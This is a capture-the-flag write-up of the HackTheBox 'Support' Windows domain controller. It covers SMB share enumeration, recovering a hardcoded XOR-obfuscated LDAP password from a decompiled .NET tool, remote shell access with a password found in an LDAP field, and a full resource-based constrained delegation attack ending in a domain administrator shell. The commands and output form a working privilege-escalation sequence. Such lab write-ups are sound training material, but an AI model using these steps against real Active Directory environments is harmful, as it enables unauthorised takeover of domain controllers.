---
description: Support box from HackTheBox write up.
password: e1f7a58ec764763886424a03d09053cf
---

# Support

## Nmap

Let's start as always with a Nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 1500 -p- -Pn 10.10.11.174                                              
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 05:33 EST
Nmap scan report for 10.10.11.174
Host is up (0.056s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49686/tcp open  unknown
49700/tcp open  unknown
55676/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 87.51 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.174
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 05:36 EST
Nmap scan report for 10.10.11.174
Host is up (0.053s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-24 10:36:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-24T10:36:51
|_  start_date: N/A
|_clock-skew: 3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.23 seconds
```

First I will try to enumerate the SMB service and then start looking around AD and Kerberos.

## SMB

Enumerating the SMB service I found these shares available:

```bash
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.174 -u guest -p '' --shares
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share
```

In the `support-tools` share I found something interesting. Apart from all the portable programs in there, there was a file called `UserInfo.exe.zip`. From it, I extracted a binary and a bunch DLLs. I decided to try to reverse it since it really looks like something custom made.

### Getting user

I moved to my Windows box and discovered that it is a .NET binary so I can get the code for it pretty easily with ILSpy. Looking around the binary code I found this class:

```c#
// UserInfo.Services.Protected
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```

Executing the funtion gives the password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. One thing to note is that this password is for the user: `support\ldap` according with the part of the code that actually use this class. I tested the credentials with `crackmapexec` and they are valid!

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Support/support-tools-share]
└─$ crackmapexec ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'        
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

After looking around I found something when enumerating users:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Support/support-tools-share]
└─$ ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"
...

# Protected Users, Users, support.htb
dn: CN=Protected Users,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
...
info: Ironside47pleasure40Watchful
...
```

That field `info` really looks like a password, let's try it out:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Support]
└─$ crackmapexec winrm 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Cool, now we can just get a shell with `evil-winrm` and start playing with the machine.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Support]
└─$ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

## Privilege escalation

After a bit, I decided to upload the Bloodhound collector to start searching for AD privilege escalation vectors. This is what I found:

<p align="center"><img alt="Screenshot with the privilege escalation vector" src="/assets/images/HackTheBox/Support/privesc_bloodhound.PNG"></p>

As you can see, the group `Shared Support Accounts` has full privileges over the `DC.SUPPORT.HTB` machine, and we are part of that group! This means we can try to escalate abusing constrained delegation. You can read more about it [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution){:target="_blank"}.

### Check prerequisites

First things first, lets check we meet all the requirements for the attack:

- Our user can create computers:
	```powershell
	*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb

	...
	ms-ds-machineaccountquota                   : 10
	...
	```
- At least Windows Server 2012
	```powershell
	*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController

	...
	OSVersion                  : Windows Server 2022 Standard
	Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
	Domain                     : support.htb
	...
	```
- Flag `msds-allowedtoactonbehalfofotheridentity` not set
	```powershell
	*Evil-WinRM* PS C:\Users\support\Documents> Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

	name msds-allowedtoactonbehalfofotheridentity
	---- ----------------------------------------
	DC
	```

### Time to pwn!

Since we meet all the requirements we can start the attack, let's create a new Machine Accound:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE01$
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE01 added

*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer fake01

pwdlastset             : 11/24/2022 9:00:23 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE01
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5101
samaccountname         : FAKE01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 11/24/2022 5:00:23 PM
instancetype           : 4
usncreated             : 82112
objectguid             : 40f08ed8-491c-4569-b5c8-be4b747a46b7
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.support.htb, HOST/FAKE01.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FAKE01
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 11/24/2022 5:00:23 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 82114
dnshostname            : FAKE01.support.htb
```

Basically we have created a fake computer that is part of the domain and we have full control over it. Now we have to create a security descriptor for the victim machine `msds-allowedtoactonbehalfofotheridentity` flag, note the machine account SID because we will need it for this (`S-1-5-21-1677581083-3380853377-188903654-5101`):

```powershell
*Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"

*Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)

*Evil-WinRM* PS C:\Users\support> (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SDBytes, 0).DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5101
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None

*Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)

*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Extracted domain 'support.htb' from 'CN=DC,OU=Domain Controllers,DC=support,DC=htb'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
Verbose: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 237 19 0 0' for object 'DC$'
```

We can check that the flag is properly set with this command:

```
*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

With all the changes we made, our fake computer account is allowed to impersonate any user in the victim machine. We can escalate our privileges by impersonating the Administrator account using Impacket to generate a Kerberos Service Ticket on behalf of the Administrator using our fake machine account:

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-getST support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn cifs/dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

Nice, we have the ticket. Now we can use it with `impacket-wmiexec` to get a shell to the domain controller as domain administrator!

```bash
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=administrator.ccache

┌──(kali㉿kali)-[~]
└─$ impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
support\administrator
```
